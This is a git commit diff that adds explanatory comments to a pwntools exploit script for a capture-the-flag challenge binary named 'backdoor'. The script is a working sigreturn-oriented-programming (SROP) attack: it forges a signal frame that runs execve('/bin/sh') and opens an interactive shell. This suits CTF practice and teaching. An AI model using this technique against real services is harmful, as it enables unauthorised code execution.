00bd14ed7046cb0bbd21a3bff3b09bc9946e56a3
yPin9 <55149609+yPin9@users.noreply.github.com>
2024-10-01 21:51:57 +0800

    add srop.py comment

--- is1abCTF2024/backdoor/srop.py
+++ is1abCTF2024/backdoor/srop.py
@@ -1,22 +1,29 @@
 from pwn import *
 
-#p = process('./backdoor')
-p = remote('127.0.0.1',33929)
+p = process('./backdoor')
+#p = remote('127.0.0.1',33929)
+
 context.arch = 'amd64'
+# `objdump -d` or `ROPgadget` to find syscall address
 syscall = 0x0000000000401165
+# xxd ./binary to find binsh
+
 binsh = 0x400100
+
+# fake signal frame
 sigframe = SigreturnFrame()
 sigframe.rax = constants.SYS_execve
-sigframe.rdi = binsh 
+sigframe.rdi = binsh
 sigframe.rsi = 0x0
 sigframe.rdx = 0x0
 sigframe.rip = syscall
+
 payload = b'a' * 8 + p64(syscall) + bytes(sigframe)
+
+# use gdb attach process
+gdb.attach(p)
+
+# send payload after receive '章魚哥'
 p.sendlineafter('章魚哥 :',payload)
 
 p.interactive()
-
-
-
-
-
